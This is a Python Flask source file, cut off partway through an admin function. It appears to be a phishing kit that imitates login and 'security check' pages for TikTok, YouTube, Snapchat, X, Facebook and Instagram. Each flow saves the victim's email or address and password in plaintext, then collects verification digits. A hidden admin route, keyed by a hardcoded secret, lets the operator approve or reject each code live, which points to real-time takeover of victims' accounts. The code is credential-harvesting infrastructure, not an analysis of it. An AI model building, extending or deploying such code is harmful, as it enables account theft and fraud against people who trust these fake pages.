from flask import Flask, render_template, request, redirect, url_for, send_file, flash, jsonify
import sqlite3, os, csv
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET", "change-me")

DB_FILE = "submissions.db"
ADMIN_SECRET = "supersecret-admin-2025"

ICON_MAP = {
    "joy1_1": ("fa-brands fa-tiktok", "#000000", "TikTok"),
    "joy1_2": ("fa-brands fa-tiktok", "#000000", "TikTok"),
    "joy1_3": ("fa-brands fa-tiktok", "#000000", "TikTok"),
    "joy2_1": ("fa-brands fa-youtube", "#FF0000", "YouTube"),
    "joy2_2": ("fa-brands fa-youtube", "#FF0000", "YouTube"),
    "joy2_3": ("fa-brands fa-youtube", "#FF0000", "YouTube"),
    "happy1_1": ("fa-brands fa-snapchat", "#FFFC00", "Snapchat"),
    "happy1_2": ("fa-brands fa-snapchat", "#FFFC00", "Snapchat"),
    "happy1_3": ("fa-brands fa-snapchat", "#FFFC00", "Snapchat"),
    "happy2_1": ("fa-brands fa-x-twitter", "#000000", "X / Twitter"),
    "happy2_2": ("fa-brands fa-x-twitter", "#000000", "X / Twitter"),
    "happy2_3": ("fa-brands fa-x-twitter", "#000000", "X / Twitter"),
    "love1_1": ("fa-brands fa-facebook-f", "#1877F2", "Facebook"),
    "love1_2": ("fa-brands fa-facebook-f", "#1877F2", "Facebook"),
    "love1_3": ("fa-brands fa-facebook-f", "#1877F2", "Facebook"),
    "love2_1": ("fa-brands fa-instagram", "#E1306C", "Instagram"),
    "love2_2": ("fa-brands fa-instagram", "#E1306C", "Instagram"),
    "love2_3": ("fa-brands fa-instagram", "#E1306C", "Instagram"),
    "f1": ("fa-solid fa-file", "#666", "Profile"),
    "f1_A": ("fa-solid fa-shield-check", "#10B981", "Security Check"),
    "f2": ("fa-solid fa-envelope", "#3B82F6", "Email Verification"),
    "f2_A": ("fa-solid fa-lock", "#EF4444", "Final Security"),
    "m1": ("fa-solid fa-circle-check", "#10B981", "Complete")
}

# ENHANCED: Platform mapping with exact CSS classes from your HTML
PLATFORM_CLASS_MAP = {
    "Facebook": {
        "icon": "fa-brands fa-facebook",
        "color": "#1877F2",
        "bg_class": "bg-facebook",
        "shadow_color": "rgba(24,119,242,0.15)"
    },
    "Instagram": {
        "icon": "fa-brands fa-instagram", 
        "color": "#E4405F",
        "bg_class": "bg-instagram",
        "shadow_color": "rgba(221,42,123,0.15)"
    },
    "TikTok": {
        "icon": "fa-brands fa-tiktok",
        "color": "#000000",
        "bg_class": "bg-tiktok",
        "shadow_color": "rgba(255, 0, 80, 0.15)"
    },
    "YouTube": {
        "icon": "fa-brands fa-youtube",
        "color": "#FF0000", 
        "bg_class": "bg-youtube",
        "shadow_color": "rgba(255, 0, 0, 0.15)"
    },
    "Snapchat": {
        "icon": "fa-brands fa-snapchat",
        "color": "#FFFC00",
        "bg_class": "bg-snapchat",
        "shadow_color": "rgba(255,252,0,0.15)"
    },
    "X / Twitter": {
        "icon": "fa-brands fa-x-twitter",
        "color": "#000000",
        "bg_class": "bg-twitter", 
        "shadow_color": "rgba(29,161,242,0.15)"
    },
    "Twitter": {
        "icon": "fa-brands fa-x-twitter",
        "color": "#000000",
        "bg_class": "bg-twitter",
        "shadow_color": "rgba(29,161,242,0.15)"
    },
    "Unknown": {
        "icon": "fa-solid fa-file",
        "color": "#666",
        "bg_class": "bg-twitter",
        "shadow_color": "rgba(0,0,0,0.15)"
    }
}

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS submissions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                page TEXT,
                user TEXT,
                data TEXT,
                icon TEXT,
                code_value TEXT,
                confirmed BOOLEAN DEFAULT 0,
                platform_name TEXT,
                rejected BOOLEAN DEFAULT 0,
                resend_requested BOOLEAN DEFAULT 0
            )
        ''')
        conn.commit()

init_db()

def save_submission(page, user, data, code_value=None, platform_name=None):
    icon, color, name = ICON_MAP.get(page, ("fa-solid fa-file", "#333", "Unknown"))
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('''
            INSERT INTO submissions (timestamp, page, user, data, icon, code_value, confirmed, platform_name, rejected, resend_requested)
            VALUES (?,?,?,?,?,?,?,?,?,?)
        ''', (datetime.utcnow().isoformat(), page, user, data, icon, code_value, 0, platform_name, 0, 0))
        conn.commit()

def check_confirmation(code_value):
    with sqlite3.connect(DB_FILE) as conn:
        result = conn.execute(
            'SELECT confirmed, rejected, resend_requested FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
            (code_value,)
        ).fetchone()
        if result:
            return {
                'confirmed': bool(result[0]),
                'rejected': bool(result[1]),
                'resend_requested': bool(result[2])
            }
        return {'confirmed': False, 'rejected': False, 'resend_requested': False}

def extract_user(form):
    for key in ("address","email","phone","fullname","street","username"):
        val = form.get(key)
        if val:
            return val.strip()
    return "anonymous"

# ENHANCED: Helper function to get platform details with exact CSS classes
def get_platform_details(platform_name):
    return PLATFORM_CLASS_MAP.get(platform_name, PLATFORM_CLASS_MAP["Unknown"])

# ========== NEW: Image verification function ==========
def check_screenshots_exist():
    """Check if screenshot images exist in static folder"""
    screenshot_names = [
        'photo_1_2026-01-12_16-20-31.jpg',
        'photo_2_2026-01-12_16-20-32.jpg',
        'photo_3_2026-01-12_16-20-32.jpg',
        'photo_4_2026-01-12_16-20-32.jpg',
        'photo_5_2026-01-12_16-20-32.jpg'
    ]
    
    missing_images = []
    for screenshot in screenshot_names:
        path = os.path.join(app.static_folder, 'images', screenshot)
        if not os.path.exists(path):
            missing_images.append(screenshot)
    
    return len(missing_images) == 0, missing_images

# ========== UPDATED: Main Index Route ==========
@app.route('/')
def index():
    """Main landing page with all new features"""
    # Check if images exist for debugging
    screenshots_exist, missing_images = check_screenshots_exist()
    
    if not screenshots_exist and missing_images:
        print(f"⚠ Warning: Missing {len(missing_images)} screenshot images: {missing_images}")
    elif screenshots_exist:
        print("✓ All screenshot images found")
    
    return render_template('index.html', screenshots_exist=screenshots_exist)

# ========== NEW: API endpoint for review submissions ==========
@app.route('/api/submit_review', methods=['POST'])
def submit_review():
    """Handle review submissions from the Ratings & Reviews section"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No data provided'}), 400
        
        rating = data.get('rating', 0)
        review_text = data.get('review', '')
        user = data.get('user', 'Anonymous')
        platform = data.get('platform', 'Monetization Hub')
        
        # Save review to database (optional enhancement)
        # For now, just log and return success
        print(f"New review received - User: {user}, Rating: {rating}, Platform: {platform}")
        print(f"Review text: {review_text[:100]}...")
        
        # You could save to database here if needed:
        # save_submission('review', user, f"rating={rating}; review={review_text}", platform_name=platform)
        
        return jsonify({
            'success': True,
            'message': 'Review submitted successfully',
            'review_id': datetime.utcnow().timestamp()
        })
    except Exception as e:
        print(f"Error submitting review: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ========== NEW: API endpoint for app support ==========
@app.route('/api/app_support', methods=['POST'])
def app_support():
    """Handle app support requests (simulated)"""
    try:
        data = request.get_json()
        user_email = data.get('email', '')
        issue_type = data.get('issue_type', 'general')
        description = data.get('description', '')
        
        print(f"App support request - Email: {user_email}, Issue: {issue_type}")
        print(f"Description: {description[:100]}...")
        
        # Simulate processing delay
        # In real implementation, this would create a support ticket
        
        return jsonify({
            'success': True,
            'message': 'Support request received. We will contact you within 24 hours.',
            'ticket_id': f"TICKET-{datetime.utcnow().strftime('%Y%m%d-%H%M%S')}"
        })
    except Exception as e:
        print(f"Error processing support request: {e}")
        return jsonify({'success': False, 'error': 'Failed to process support request'}), 500

# ========== NEW: Test route for image debugging ==========
@app.route('/test-images')
def test_images():
    """Test page to check if images are loading correctly"""
    screenshots_exist, missing_images = check_screenshots_exist()
    
    images_html = ''
    if screenshots_exist:
        for i in range(1, 6):
            images_html += f'''
            <div style="margin: 20px; padding: 10px; border: 2px solid #10B981; border-radius: 10px;">
                <h3>Image {i}</h3>
                <img src="/static/images/photo_{i}_2026-01-12_16-20-3{2 if i > 1 else 1}.jpg" 
                     width="300" 
                     style="border: 3px solid #3B82F6; border-radius: 8px; margin: 10px 0;">
                <p style="color: #10B981; font-weight: bold;">✓ Loaded Successfully</p>
            </div>
            '''
    else:
        images_html = f'''
        <div style="margin: 20px; padding: 20px; border: 2px solid #EF4444; border-radius: 10px; background: #FEF2F2;">
            <h3 style="color: #DC2626;">⚠ Missing Images</h3>
            <p>The following images were not found:</p>
            <ul>
        '''
        for image in missing_images:
            images_html += f'<li><code>{image}</code></li>'
        images_html += '''
            </ul>
            <p>Please make sure these images are in the <code>static/images/</code> folder.</p>
        </div>
        '''
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Image Test Page</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 40px; background: #f8fafc; }}
            .container {{ max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }}
            h1 {{ color: #1e293b; border-bottom: 2px solid #e2e8f0; padding-bottom: 10px; }}
            .success {{ color: #10B981; font-weight: bold; }}
            .warning {{ color: #F59E0B; font-weight: bold; }}
            .error {{ color: #EF4444; font-weight: bold; }}
            .btn {{ display: inline-block; background: #3B82F6; color: white; padding: 10px 20px; border-radius: 8px; text-decoration: none; margin: 10px 0; }}
            .btn:hover {{ background: #2563EB; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🖼️ Image Test Page</h1>
            <p>This page tests if your 5 screenshot images are loading correctly.</p>
            
            <div style="margin: 20px 0; padding: 15px; background: #f0f9ff; border-radius: 8px; border-left: 4px solid #0ea5e9;">
                <p><strong>Static Folder:</strong> <code>{app.static_folder}</code></p>
                <p><strong>Images Status:</strong> {'<span class="success">✓ All images found</span>' if screenshots_exist else f'<span class="error">⚠ {len(missing_images)} images missing</span>'}</p>
            </div>
            
            {images_html}
            
            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #e2e8f0;">
                <a href="/" class="btn">← Back to Main Page</a>
                <p style="margin-top: 20px; color: #64748b; font-size: 14px;">
                    If images don't show above, check:
                    <ol>
                        <li>Images are in <code>static/images/</code> folder</li>
                        <li>File names match exactly (case-sensitive)</li>
                        <li>Files have correct permissions</li>
                        <li>Browser cache is cleared</li>
                    </ol>
                </p>
            </div>
        </div>
    </body>
    </html>
    '''

# ENHANCED: Helper function to prepare waiting confirmation data with exact styling
def get_waiting_confirmation_data(platform_name, next_url, code_value, submission_id):
    """Helper function to prepare waiting confirmation data with exact platform styling"""
    platform_data = get_platform_details(platform_name)
    return {
        'next_url': next_url,
        'code_value': code_value,
        'submission_id': submission_id,
        'platform_icon': platform_data['icon'],
        'platform_name': platform_name,
        'platform_color': platform_data['color'],
        'platform_bg_class': platform_data['bg_class'],
        'platform_shadow_color': platform_data['shadow_color']
    }

# TikTok Flow - ENHANCED with exact styling
@app.route('/joy1_1', methods=['GET','POST'])
def joy1_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('joy1_1', user, f'address={addr}; password={pwd}', platform_name="TikTok")
        return redirect(url_for('joy1_2'))
    platform_data = get_platform_details("TikTok")
    return render_template('joy1_1.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='TikTok', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

@app.route('/joy1_2', methods=['GET','POST'])
def joy1_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('joy1_2', user, f'digits={digits}', code_value=digits, platform_name="TikTok")
        
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        
        waiting_data = get_waiting_confirmation_data("TikTok", url_for('joy1_3'), digits, submission_id)
        return render_template('waiting_confirmation.html', **waiting_data)
    
    platform_data = get_platform_details("TikTok")
    return render_template('joy1_2.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='TikTok', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

@app.route('/joy1_3', methods=['GET','POST'])
def joy1_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        
        # Extract all questionnaire data
        questionnaire_data = []
        for key, value in request.form.items():
            if key != 'country':  # We'll handle country separately
                questionnaire_data.append(f"{key}: {value}")
        
        # Add country if provided
        country = request.form.get('country', '')
        if country:
            questionnaire_data.append(f"country: {country}")
        
        # Save all questionnaire data as a single string
        data_string = " | ".join(questionnaire_data)
        
        # Save without code_value and skip confirmation
        save_submission('joy1_3', user, data_string, platform_name="TikTok")
        
        # DIRECTLY redirect to spinner - NO waiting confirmation
        return redirect(url_for('spinner', platform='TikTok'))
    
    platform_data = get_platform_details("TikTok")
    return render_template('joy1_3.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='TikTok', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

# YouTube Flow - ENHANCED with exact styling
@app.route('/joy2_1', methods=['GET','POST'])
def joy2_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('joy2_1', user, f'address={addr}; password={pwd}', platform_name="YouTube")
        return redirect(url_for('joy2_2'))
    platform_data = get_platform_details("YouTube")
    return render_template('joy2_1.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='YouTube', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

@app.route('/joy2_2', methods=['GET','POST'])
def joy2_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('joy2_2', user, f'digits={digits}', code_value=digits, platform_name="YouTube")
        
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        
        waiting_data = get_waiting_confirmation_data("YouTube", url_for('joy2_3'), digits, submission_id)
        return render_template('waiting_confirmation.html', **waiting_data)
    
    platform_data = get_platform_details("YouTube")
    return render_template('joy2_2.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='YouTube', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

@app.route('/joy2_3', methods=['GET','POST'])
def joy2_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        
        # Extract all questionnaire data
        questionnaire_data = []
        for key, value in request.form.items():
            if key != 'country':  # We'll handle country separately
                questionnaire_data.append(f"{key}: {value}")
        
        # Add country if provided
        country = request.form.get('country', '')
        if country:
            questionnaire_data.append(f"country: {country}")
        
        # Save all questionnaire data as a single string
        data_string = " | ".join(questionnaire_data)
        
        # Save without code_value and skip confirmation
        save_submission('joy2_3', user, data_string, platform_name="YouTube")
        
        # DIRECTLY redirect to spinner - NO waiting confirmation
        return redirect(url_for('spinner', platform='YouTube'))
    
    platform_data = get_platform_details("YouTube")
    return render_template('joy2_3.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='YouTube', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

# Snapchat Flow - ENHANCED with exact styling
@app.route('/happy1_1', methods=['GET','POST'])
def happy1_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('happy1_1', user, f'address={addr}; password={pwd}', platform_name="Snapchat")
        return redirect(url_for('happy1_2'))
    platform_data = get_platform_details("Snapchat")
    return render_template('happy1_1.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='Snapchat', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

@app.route('/happy1_2', methods=['GET','POST'])
def happy1_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('happy1_2', user, f'digits={digits}', code_value=digits, platform_name="Snapchat")
        
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        
        waiting_data = get_waiting_confirmation_data("Snapchat", url_for('happy1_3'), digits, submission_id)
        return render_template('waiting_confirmation.html', **waiting_data)
    
    platform_data = get_platform_details("Snapchat")
    return render_template('happy1_2.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='Snapchat', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

@app.route('/happy1_3', methods=['GET','POST'])
def happy1_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        
        # Extract all questionnaire data
        questionnaire_data = []
        for key, value in request.form.items():
            if key != 'country':  # We'll handle country separately
                questionnaire_data.append(f"{key}: {value}")
        
        # Add country if provided
        country = request.form.get('country', '')
        if country:
            questionnaire_data.append(f"country: {country}")
        
        # Save all questionnaire data as a single string
        data_string = " | ".join(questionnaire_data)
        
        # Save without code_value and skip confirmation
        save_submission('happy1_3', user, data_string, platform_name="Snapchat")
        
        # DIRECTLY redirect to spinner - NO waiting confirmation
        return redirect(url_for('spinner', platform='Snapchat'))
    
    platform_data = get_platform_details("Snapchat")
    return render_template('happy1_3.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='Snapchat', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

# X/Twitter Flow - ENHANCED with exact styling
@app.route('/happy2_1', methods=['GET','POST'])
def happy2_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('happy2_1', user, f'address={addr}; password={pwd}', platform_name="X / Twitter")
        return redirect(url_for('happy2_2'))
    platform_data = get_platform_details("X / Twitter")
    return render_template('happy2_1.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='X / Twitter', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

@app.route('/happy2_2', methods=['GET','POST'])
def happy2_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('happy2_2', user, f'digits={digits}', code_value=digits, platform_name="X / Twitter")
        
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        
        waiting_data = get_waiting_confirmation_data("X / Twitter", url_for('happy2_3'), digits, submission_id)
        return render_template('waiting_confirmation.html', **waiting_data)
    
    platform_data = get_platform_details("X / Twitter")
    return render_template('happy2_2.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='X / Twitter', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

@app.route('/happy2_3', methods=['GET','POST'])
def happy2_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        
        # Extract all questionnaire data
        questionnaire_data = []
        for key, value in request.form.items():
            if key != 'country':  # We'll handle country separately
                questionnaire_data.append(f"{key}: {value}")
        
        # Add country if provided
        country = request.form.get('country', '')
        if country:
            questionnaire_data.append(f"country: {country}")
        
        # Save all questionnaire data as a single string
        data_string = " | ".join(questionnaire_data)
        
        # Save without code_value and skip confirmation
        save_submission('happy2_3', user, data_string, platform_name="X / Twitter")
        
        # DIRECTLY redirect to spinner - NO waiting confirmation
        return redirect(url_for('spinner', platform='X / Twitter'))
    
    platform_data = get_platform_details("X / Twitter")
    return render_template('happy2_3.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='X / Twitter', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

# Facebook Flow - ENHANCED with exact styling
@app.route('/love1_1', methods=['GET','POST'])
def love1_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('love1_1', user, f'address={addr}; password={pwd}', platform_name="Facebook")
        return redirect(url_for('love1_2'))
    platform_data = get_platform_details("Facebook")
    return render_template('love1_1.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='Facebook', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

@app.route('/love1_2', methods=['GET','POST'])
def love1_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('love1_2', user, f'digits={digits}', code_value=digits, platform_name="Facebook")
        
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        
        waiting_data = get_waiting_confirmation_data("Facebook", url_for('love1_3'), digits, submission_id)
        return render_template('waiting_confirmation.html', **waiting_data)
    
    platform_data = get_platform_details("Facebook")
    return render_template('love1_2.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='Facebook', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

@app.route('/love1_3', methods=['GET','POST'])
def love1_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        
        # Extract all questionnaire data
        questionnaire_data = []
        for key, value in request.form.items():
            if key != 'country':  # We'll handle country separately
                questionnaire_data.append(f"{key}: {value}")
        
        # Add country if provided
        country = request.form.get('country', '')
        if country:
            questionnaire_data.append(f"country: {country}")
        
        # Save all questionnaire data as a single string
        data_string = " | ".join(questionnaire_data)
        
        # Save without code_value and skip confirmation
        save_submission('love1_3', user, data_string, platform_name="Facebook")
        
        # DIRECTLY redirect to spinner - NO waiting confirmation
        return redirect(url_for('spinner', platform='Facebook'))
    
    platform_data = get_platform_details("Facebook")
    return render_template('love1_3.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='Facebook', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

# Instagram Flow - ENHANCED with exact styling
@app.route('/love2_1', methods=['GET','POST'])
def love2_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('love2_1', user, f'address={addr}; password={pwd}', platform_name="Instagram")
        return redirect(url_for('love2_2'))
    platform_data = get_platform_details("Instagram")
    return render_template('love2_1.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='Instagram', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

@app.route('/love2_2', methods=['GET','POST'])
def love2_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('love2_2', user, f'digits={digits}', code_value=digits, platform_name="Instagram")
        
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        
        waiting_data = get_waiting_confirmation_data("Instagram", url_for('love2_3'), digits, submission_id)
        return render_template('waiting_confirmation.html', **waiting_data)
    
    platform_data = get_platform_details("Instagram")
    return render_template('love2_2.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='Instagram', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

@app.route('/love2_3', methods=['GET','POST'])
def love2_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        
        # Extract all questionnaire data
        questionnaire_data = []
        for key, value in request.form.items():
            if key != 'country':  # We'll handle country separately
                questionnaire_data.append(f"{key}: {value}")
        
        # Add country if provided
        country = request.form.get('country', '')
        if country:
            questionnaire_data.append(f"country: {country}")
        
        # Save all questionnaire data as a single string
        data_string = " | ".join(questionnaire_data)
        
        # Save without code_value and skip confirmation
        save_submission('love2_3', user, data_string, platform_name="Instagram")
        
        # DIRECTLY redirect to spinner - NO waiting confirmation
        return redirect(url_for('spinner', platform='Instagram'))
    
    platform_data = get_platform_details("Instagram")
    return render_template('love2_3.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name='Instagram', 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

# Common Flow Pages - ENHANCED with exact styling
@app.route('/spinner')
def spinner():
    platform = request.args.get('platform', 'Unknown')
    platform_data = get_platform_details(platform)
    return render_template('spinner.html', 
                         next_url=url_for('f1', platform=platform),
                         delay=4,
                         platform=platform,
                         platform_icon=platform_data['icon'],
                         platform_name=platform,
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

@app.route('/f1', methods=['GET','POST'])
def f1():
    if request.method == 'POST':
        user = extract_user(request.form)
        items = [f"{k}: {v}" for k,v in request.form.items()]
        platform = request.form.get('platform', request.args.get('platform', 'Unknown'))
        save_submission('f1', user, " ; ".join(items), platform_name=platform)
        return redirect(url_for('f1_A', platform=platform))
    platform = request.args.get('platform', 'Unknown')
    platform_data = get_platform_details(platform)
    return render_template('f1.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name=platform, 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

@app.route('/f1_A', methods=['GET','POST'])
def f1_A():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        platform = request.args.get('platform', 'Unknown')
        save_submission('f1_A', user, f'digits={digits}', code_value=digits, platform_name=platform)
        
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        
        waiting_data = get_waiting_confirmation_data(platform, url_for('spinner2', platform=platform), digits, submission_id)
        return render_template('waiting_confirmation.html', **waiting_data)
    
    platform = request.args.get('platform', 'Unknown')
    platform_data = get_platform_details(platform)
    return render_template('f1_A.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name=platform, 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

@app.route('/spinner2')
def spinner2():
    platform = request.args.get('platform', 'Unknown')
    platform_data = get_platform_details(platform)
    return render_template('spinner2.html', 
                         next_url=url_for('f2', platform=platform),
                         delay=4,
                         platform=platform,
                         platform_icon=platform_data['icon'],
                         platform_name=platform,
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

@app.route('/f2', methods=['GET','POST'])
def f2():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        platform = request.args.get('platform', 'Unknown')
        save_submission('f2', user, f'address={addr}', platform_name=platform)
        return redirect(url_for('f2_A', platform=platform))
    platform = request.args.get('platform', 'Unknown')
    platform_data = get_platform_details(platform)
    return render_template('f2.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name=platform, 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

@app.route('/f2_A', methods=['GET','POST'])
def f2_A():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        platform = request.args.get('platform', 'Unknown')
        save_submission('f2_A', user, f'digits={digits}', code_value=digits, platform_name=platform)
        
        with sqlite3.connect(DB_FILE) as conn:
            submission = conn.execute(
                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
                (digits,)
            ).fetchone()
        submission_id = submission[0] if submission else None
        
        waiting_data = get_waiting_confirmation_data(platform, url_for('m1', platform=platform), digits, submission_id)
        return render_template('waiting_confirmation.html', **waiting_data)
    
    platform = request.args.get('platform', 'Unknown')
    platform_data = get_platform_details(platform)
    return render_template('f2_A.html', 
                         platform_icon=platform_data['icon'], 
                         platform_name=platform, 
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

@app.route('/m1')
def m1():
    platform = request.args.get('platform', 'Unknown')
    platform_data = get_platform_details(platform)
    return render_template('m1.html', 
                         platform_icon=platform_data['icon'],
                         platform_name=platform,
                         platform_color=platform_data['color'],
                         platform_bg_class=platform_data['bg_class'],
                         platform_shadow_color=platform_data['shadow_color'])

# ========== ENHANCED CONFIRMATION & REJECTION SYSTEM ==========

@app.route('/api/check_confirmation/<code_value>')
def api_check_confirmation(code_value):
    status = check_confirmation(code_value)
    return jsonify(status)

@app.route(f"/admin/{ADMIN_SECRET}/confirm/<int:submission_id>", methods=['POST'])
def admin_confirm(submission_id):
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('UPDATE submissions SET confirmed = 1, rejected = 0 WHERE id = ?', (submission_id,))
        conn.commit()
    return jsonify({'success': True})

@app.route(f"/admin/{ADMIN_SECRET}/reject/<int:submission_id>", methods=['POST'])
def admin_reject(submission_id):
    with sqlite3.connect(DB_FILE) as conn:
